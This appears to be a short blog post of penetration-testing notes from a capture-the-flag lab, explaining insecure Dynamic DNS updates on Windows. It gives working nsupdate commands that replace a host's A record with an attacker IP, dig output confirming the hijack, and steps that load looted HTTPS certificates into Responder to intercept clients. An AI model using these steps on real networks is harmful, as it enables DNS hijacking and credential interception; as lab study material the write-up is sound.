---
layout: post
title: Insecure Dynamic DNS Updates
description: Insecure Dynamic DNS Updates
summary: Insecure Dynamic DNS Updates
tags: [dns,windows,foothold]
minute: 1
---
## What is Dynamic DNS Updates?
* Improves management of DNS records
* For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS
* More info: [How to configure DNS dynamic updates in Windows Server - Windows Server | Microsoft Docs](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003)

![](/spindel/assets/Insecure%20Dynamic%20DNS%20Updates/secure-dns.png)

## Vulnerability
An attacker can replace a record by its own IP which will force clients to connect to it.

## Steps
* Delete record and replace with attacker IP `10.11.40.33`

```bash
➜ nsupdate
> server 10.10.23.72
> update delete selfservice.windcorp.thm 
> send
> update add selfservice.windcorp.thm 1234 A 10.11.40.33
> send
> quit
```

* Verify A record points to attacker IP

```bash
➜  ra2 dig selfservice.windcorp.thm a @thm

; <<>> DiG 9.16.15-Debian <<>> selfservice.windcorp.thm a @thm
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57355
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;selfservice.windcorp.thm.	IN	A

;; ANSWER SECTION:
selfservice.windcorp.thm. 1234	IN	A	10.11.40.33

;; Query time: 188 msec
;; SERVER: 10.10.23.72#53(10.10.23.72)
;; WHEN: Sat Sep 18 08:00:02 EDT 2021
;; MSG SIZE  rcvd: 69
```

* If you have HTTPS certificates looted from victim, put it in responder

```bash
sudo cp *pem /usr/share/responder/certs/
```

* Point responder config to the certs

```bash
➜  scans cat /etc/responder/Responder.conf| grep cert
SSLCert = certs/crt.pem
SSLKey = certs/key.pem
➜  scans 
```

* Fire up responder and wait for clients to connect to you

```bash
sudo responder -I tun0
```

